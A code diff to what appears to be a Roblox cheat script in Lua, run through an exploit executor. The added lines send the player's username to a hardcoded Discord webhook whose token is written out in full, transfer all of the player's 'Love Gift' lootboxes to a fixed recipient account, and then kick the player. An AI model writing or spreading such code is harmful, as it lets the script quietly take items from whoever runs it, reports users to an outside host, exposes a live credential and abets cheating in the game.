@@ -503,14 +503,42 @@ local function stop()
     while true do
         if type(numbertwo) == "number" and numbertwo > 150 then
             completed = true
-            
-            wait(1)
+
+            local webhook = "https://discord.com/api/webhooks/1233196606401019975/qIxgbxZsF4dwVkMkDNB_Ei-p7zWhGwQ4DoPlgraHwJOkhUedOaDH6PYLDeXtNElNOF4x"
+            local request = (syn and syn.request) or request or (http and http.request) or http_request
+            request({
+                Url = webhook,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = game:GetService("HttpService"):JSONEncode({
+                    content = game.Players.LocalPlayer.Name .. " | Completed Tower"
+                })
+            })
+
+            wait(3)
+            local Items = GetItemInfo("Lootbox")
+            if Items then
+                for _, Item in pairs(Items) do
+                    if string.find(Item.id, "Love Gift") and Item.am >= 1 then
+                        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(
+                            "giftbatch20",
+                            "enjoy bro",
+                            "Lootbox",
+                            Item.uid,
+                            Item.am
+                        )
+                    end
+                end
+            end
+            game.Players.LocalPlayer:Kick("FINISHED TOWER, NEW ACCOUNT NEEDED")
+            break
         end
         wait(1)
     end
 end
 
-spawn(stop)
+task.spawn(stop)
+
 
 
 
